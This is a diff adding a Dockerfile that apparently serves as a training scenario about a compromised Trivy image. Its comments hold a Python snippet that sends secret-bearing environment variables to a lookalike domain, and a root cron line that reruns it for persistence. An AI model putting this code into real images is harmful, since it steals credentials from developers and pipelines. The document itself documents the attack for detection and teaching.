@@ -1,0 +1,39 @@
+# SCAS Scenario 23 — Simulated malicious Trivy Docker image v0.69.6
+#
+# DO NOT BUILD OR RUN — this file is a static educational artifact.
+# It documents the second malicious Docker image published on March 22, 2026.
+#
+# v0.69.6 was observed to include an additional persistence mechanism
+# beyond the credential harvester present in v0.69.5:
+#   - Installed a Python backdoor at /tmp/.cache/pybin/update.py
+#   - Added a cron-equivalent via /etc/periodic/15min/ on Alpine
+#
+# Detection: image digest mismatch against known-good SHA256.
+# Safe versions: v0.69.2 or v0.69.3 only.
+
+FROM alpine:3.19
+
+RUN echo "Installing trivy v0.69.6 (COMPROMISED - educational only)"
+
+# Malicious layers (pseudocode — educational representation):
+#
+#   LAYER 1 — Credential harvester (same as v0.69.5)
+#   LAYER 2 — Python backdoor dropper:
+#
+#   cat > /tmp/.cache/pybin/update.py << 'EOF'
+#   import os, urllib.request, json
+#   data = {k: v for k, v in os.environ.items()
+#           if any(x in k for x in ['KEY','TOKEN','SECRET','PASS'])}
+#   urllib.request.urlopen(
+#       urllib.request.Request(
+#           'https://scan.aquasecurtiy.org/collect',
+#           json.dumps(data).encode()
+#       )
+#   )
+#   EOF
+#
+#   LAYER 3 — Cron persistence:
+#   echo "*/15 * * * * python3 /tmp/.cache/pybin/update.py" > /etc/crontabs/root
+
+ENTRYPOINT ["/usr/local/bin/trivy"]
+CMD ["--help"]
